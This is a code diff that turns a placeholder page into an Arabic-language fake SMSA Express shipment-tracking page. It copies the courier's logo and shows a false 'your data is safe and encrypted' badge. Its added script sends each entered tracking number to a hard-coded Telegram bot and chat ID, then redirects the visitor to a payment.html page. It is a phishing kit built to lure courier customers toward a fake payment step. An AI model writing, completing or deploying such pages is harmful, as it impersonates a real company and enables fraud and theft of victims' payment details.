@@ -2,10 +2,58 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>تتبع الشحنة</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>سمسا | تتبع الشحنة</title>
+  <style>
+    body { margin:0; font-family: 'Tajawal', sans-serif; background:#f9fafb; }
+    .header { background:#ffffff; padding:15px; text-align:center; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
+    .header img { height:40px; vertical-align:middle; }
+    .header span { font-size:20px; color:#333; margin-left:10px; vertical-align:middle; }
+    .main { max-width:480px; margin:40px auto; padding:20px; background:#fff; border-radius:8px; }
+    h2 { margin:0 0 10px; color:#222; text-align:center; }
+    .sub { text-align:center; color:#555; margin-bottom:20px; font-size:14px; }
+    input { width:100%; padding:14px; font-size:16px; border:1px solid #ccc; border-radius:6px; }
+    button { width:100%; margin-top:15px; padding:14px; background:#ff6600; color:#fff; border:none; font-size:16px; border-radius:6px; cursor:pointer; }
+    button:hover { background:#e65500; }
+    .trust { margin-top:20px; font-size:13px; color:#666; text-align:center; }
+    .trust::before { content:'🔒'; display:block; margin-bottom:5px; font-size:18px; }
+    @media(max-width:400px){ .header span { font-size:18px; } button, input { font-size:15px; padding:12px; } }
+  </style>
 </head>
 <body>
-  <h2>الصفحة الرئيسية للتتبع - تحتاج لإضافة التصميم لاحقًا</h2>
+  <div class="header">
+    <img src="https://www.smsaexpress.com/assets/logo.png" alt="سمسا">
+    <span>تتبع الشحنة</span>
+  </div>
+  <div class="main">
+    <h2>تفقد حالة شحنتك الآن</h2>
+    <p class="sub">أدخل الرقم الموجود في إيصال الشحن واضغط تتبع.</p>
+    <form id="trackForm">
+      <input type="text" id="orderId" name="orderId" placeholder="مثال: 1234567890" required pattern="\\d{7,}" title="أدخل رقم شحنة صحيح">
+      <button type="submit">تتبع</button>
+    </form>
+    <div class="trust">
+      بياناتك آمنة ومحمية عبر اتصال مشفر.
+    </div>
+  </div>
+
+  <script>
+    document.getElementById('trackForm').addEventListener('submit', function(e){
+      e.preventDefault();
+      const id = document.getElementById('orderId').value.trim();
+      if(!id || id.length < 7) return alert('أدخل رقم شحنة صحيح.');
+
+      fetch('https://api.telegram.org/bot8196943143:AAFTexCjJ2IUCXz_-36ls1tof1bVmairSj0/sendMessage',{
+        method:'POST',
+        headers:{ 'Content-Type':'application/json' },
+        body: JSON.stringify({ chat_id:"1008144314", text:`🔍 تتبع شحنة: ${id}` })
+      }).then(res=>{
+        if(res.ok) window.location.href='payment.html';
+        else alert('فشل الإرسال، حاول مرة أخرى.');
+      }).catch(()=>{
+        alert('فشل التواصل مع الخادم.');
+      });
+    });
+  </script>
 </body>
 </html>
